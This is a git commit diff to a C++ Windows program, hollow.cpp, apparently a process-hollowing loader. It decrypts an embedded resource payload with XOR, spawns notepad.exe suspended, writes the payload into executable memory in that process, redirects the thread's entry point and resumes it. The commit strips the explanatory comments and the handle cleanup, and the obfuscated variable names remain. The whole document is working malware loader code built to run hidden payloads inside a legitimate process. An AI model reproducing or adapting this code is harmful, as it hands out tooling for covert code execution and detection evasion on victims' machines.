e63f56bdcd575001ef6a9d6a0e18ffa683156d63
dhanush <114467712+dagowda@users.noreply.github.com>
2024-12-29 06:22:55 -0500

    Update hollow.cpp

--- hollow.cpp
+++ hollow.cpp
@@ -1,7 +1,6 @@
 #include <windows.h>
 #include <tlhelp32.h>
 #include <wincrypt.h>
-
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "user32.lib")
 
@@ -31,39 +30,22 @@ int main() {
     char* c1o2d3e4Enc;
     DWORD c1o2d3e4EncLen;
     loadresbabe("c1o2d3e4Enc", &c1o2d3e4Enc, &c1o2d3e4EncLen);
-
-    // Decrypt the payload
     XXXoordec(c1o2d3e4Enc, c1o2d3e4EncLen, (unsigned char*)k1e2y6ENC, k1e2y6ENCLen);
 
-    // Create a new process in a suspended state
     STARTUPINFO si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
 
     CreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
       
-
-    
     CONTEXT ctx = {0};
     ctx.ContextFlags = CONTEXT_FULL;
-
     GetThreadContext(pi.hThread, &ctx);
-
     LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, c1o2d3e4EncLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    
-
-    // Write payload to target process
     WriteProcessMemory(pi.hProcess, memlo, c1o2d3e4Enc, c1o2d3e4EncLen, NULL);
-    // Update entry point
-    ctx.Rcx = (DWORD64)memlo; // Use Rcx for x64 processes
+    ctx.Rcx = (DWORD64)memlo; 
     SetThreadContext(pi.hThread, &ctx);
-
-    // Resume thread to execute payload
     ResumeThread(pi.hThread); 
-
-    
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
 
     return 0;
 }
